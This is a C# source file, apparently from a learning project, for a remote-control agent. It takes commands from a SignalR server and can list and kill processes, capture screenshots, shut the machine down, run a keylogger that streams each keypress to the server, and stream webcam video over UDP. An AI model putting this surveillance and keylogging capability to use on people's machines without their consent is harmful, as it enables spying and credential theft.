using RCS.Agent.Services;
using RCS.Agent.Services.Windows;
using RCS.Common.Models;
using RCS.Common.Protocols;
using System.Net.Sockets;

namespace RCS.Agent
{
    class Program
    {

        public const int FRAME_PER_SECOND = 60;     // FPS 
        public const int SECOND_PER_FRAME = 1000 / FRAME_PER_SECOND; // Thời gian mỗi frame (ms)

        private static SignalRClient _signalRClient;
        private static ApplicationManager _appManager;
        private static ProcessMonitor _processMonitor;
        private static SystemControl _systemControl;
        private static MediaCapture _mediaCapture;
        private static Keylogger _keylogger;
        
        private static CancellationTokenSource _webcamCts;
        private static UdpClient _udpClient; 
        
        // --- CẤU HÌNH ---
        private const string SERVER_UDP_HOST = "localhost"; 
        private const int SERVER_UDP_PORT = 6000;
        private const string AGENT_ID = "Agent_12345";
        private const string SERVER_URL = "http://localhost:5000/agenthub";

        private const int MAX_PACKET_SIZE = 45000; 
        private static int _frameSequence = 0; 

        static async Task Main(string[] args)
        {
            Console.Title = $"RCS Agent - {AGENT_ID}";
            InitializeServices();
            await _signalRClient.ConnectAsync(AGENT_ID);
            Console.WriteLine("Agent is running. Press CTRL+C to exit.");
            await Task.Delay(-1);
        }

        private static void InitializeServices()
        {
            _appManager = new ApplicationManager();
            _processMonitor = new ProcessMonitor();
            _systemControl = new SystemControl();
            _mediaCapture = new MediaCapture();
            _keylogger = new Keylogger();
            _signalRClient = new SignalRClient(SERVER_URL);
            _udpClient = new UdpClient();
            _signalRClient.OnCommandReceived += HandleCommand;
        }

        private static async Task HandleCommand(CommandMessage cmd)
        {
            Console.WriteLine($"[Command] {cmd.Action}");
            try
            {
                switch (cmd.Action)
                {
                    case ProtocolConstants.ActionAppList: await SendResponse(cmd.Action, _appManager.GetInstalledApps()); break;
                    case ProtocolConstants.ActionAppStart: _appManager.StartApp(GetParam(cmd, "name")); await SendResponse(cmd.Action, "started"); break;
                    case ProtocolConstants.ActionAppStop: _appManager.StopApp(GetParam(cmd, "name")); await SendResponse(cmd.Action, "stopped"); break;
                    case ProtocolConstants.ActionProcessList: await SendResponse(cmd.Action, _processMonitor.GetProcesses()); break;
                    case ProtocolConstants.ActionProcessStart: _processMonitor.StartProcess(GetParam(cmd, "name")); await SendResponse(cmd.Action, "started"); break;
                    case ProtocolConstants.ActionProcessStop: if(int.TryParse(GetParam(cmd, "pid"), out int pid)) _processMonitor.KillProcess(pid); await SendResponse(cmd.Action, "killed"); break;
                    case ProtocolConstants.ActionScreenshot: await _signalRClient.SendBinaryAsync(_mediaCapture.CaptureScreenBase64()); break;
                    case ProtocolConstants.ActionShutdown: _systemControl.Shutdown(); break;
                    case ProtocolConstants.ActionRestart: _systemControl.Restart(); break;
                    case ProtocolConstants.ActionKeyloggerStart: _keylogger.Start(async (key) => { await _signalRClient.SendUpdateAsync(new RealtimeUpdate { Event = "key_pressed", Data = key }); }); break;
                    case ProtocolConstants.ActionKeyloggerStop: _keylogger.Stop(); await SendResponse(cmd.Action, "stopped"); break;

                    case ProtocolConstants.ActionWebcamOn:
                        if (_webcamCts == null)
                        {
                            _webcamCts = new CancellationTokenSource();
                            _ = Task.Run(async () => await StreamWebcamLoop(_webcamCts.Token));
                        }
                        break;

                    case ProtocolConstants.ActionWebcamOff:
                        // 1. Hủy vòng lặp
                        _webcamCts?.Cancel();
                        _webcamCts = null;
                        
                        // 2. SỬA: Cưỡng chế tắt Camera ngay lập tức (không chờ vòng lặp thoát)
                        // Điều này giúp đèn Camera tắt ngay khi bấm nút
                        _mediaCapture.StopWebcam();
                        
                        Console.WriteLine("[Webcam] Force stopped.");
                        await SendResponse(cmd.Action, "stopped");
                        break;
                }
            }
            catch (Exception ex) { Console.WriteLine($"Error: {ex.Message}"); }
        }

        private static async Task StreamWebcamLoop(CancellationToken token)
        {
            Console.WriteLine("[Webcam] UDP High Quality Stream started...");
            
            if (!_mediaCapture.StartWebcam()) return;

            while (!token.IsCancellationRequested)
            {
                try
                {
                    // Lấy ảnh Raw Bytes
                    byte[] imageBytes = _mediaCapture.GetWebcamFrameBytes();
                    
                    if (imageBytes != null && imageBytes.Length > 0)
                    {
                        await SendFragmentedImage(imageBytes);
                    }
                    
                    await Task.Delay(SECOND_PER_FRAME, token);
                }
                catch (TaskCanceledException) { break; }
                catch (ObjectDisposedException) { break; } // Bắt lỗi nếu object bị hủy ngang
                catch (Exception ex)
                {
                    // Chỉ log nếu không phải lỗi do hủy tác vụ
                    if (!token.IsCancellationRequested)
                        Console.WriteLine($"[Stream Error] {ex.Message}");
                }
            }
            // Đảm bảo tắt lần nữa khi thoát vòng lặp
            _mediaCapture.StopWebcam();
        }

        private static async Task SendFragmentedImage(byte[] imageBytes)
        {
            try 
            {   
                long timestamp = DateTime.UtcNow.Ticks; // Lấy thời gian hiện tại (Ticks: 100ns)
                int totalLength = imageBytes.Length;
                ushort totalPackets = (ushort)Math.Ceiling((double)totalLength / MAX_PACKET_SIZE);
                int frameId = Interlocked.Increment(ref _frameSequence);

                const int HEADER_SIZE = 20;

                for (ushort i = 0; i < totalPackets; i++)
                {
                    int offset = i * MAX_PACKET_SIZE;
                    int size = Math.Min(MAX_PACKET_SIZE, totalLength - offset);
                    
                    // --- TẠO HEADER (20 Bytes) ---
                    // [0-3]: Frame ID
                    // [4-5]: Packet Index
                    // [6-7]: Total Packets
                    // [8-11]: Payload Size
                    // [12-19]: NEW: Timestamp (Ticks)
                    byte[] header = new byte[HEADER_SIZE];
                    BitConverter.GetBytes(frameId).CopyTo(header, 0);
                    BitConverter.GetBytes(i).CopyTo(header, 4);
                    BitConverter.GetBytes(totalPackets).CopyTo(header, 6);
                    BitConverter.GetBytes(size).CopyTo(header, 8);
                    BitConverter.GetBytes(timestamp).CopyTo(header, 12); 

                    byte[] packet = new byte[HEADER_SIZE + size];
                    Array.Copy(header, 0, packet, 0, HEADER_SIZE);
                    Array.Copy(imageBytes, offset, packet, HEADER_SIZE, size);

                    await _udpClient.SendAsync(packet, packet.Length, SERVER_UDP_HOST, SERVER_UDP_PORT);
                }
            }
            catch { }
        }

        private static async Task SendResponse(string action, object data) { await _signalRClient.SendResponseAsync(new ResponseMessage { Action = action, Response = data }); }
        
        private static string GetParam(CommandMessage cmd, string key) {
             if (cmd.Params == null) return "";
            try 
            {
                if (cmd.Params is System.Text.Json.JsonElement jsonElement) { if (jsonElement.TryGetProperty(key, out var value)) return value.ToString(); }
                var str = cmd.Params.ToString();
                if (str.Contains(key)) {
                    var parts = str.Split(new[] { key, ":" }, StringSplitOptions.RemoveEmptyEntries);
                    for (int i = 0; i < parts.Length; i++) { if (parts[i].Contains(key) && i + 1 < parts.Length) return parts[i+1].Replace("}", "").Replace("\"", "").Replace(",", "").Trim(); }
                     if (parts.Length > 1) return parts[1].Replace("}", "").Replace("\"", "").Replace(",", "").Trim();
                }
            } catch { } return "";
        }
    }
}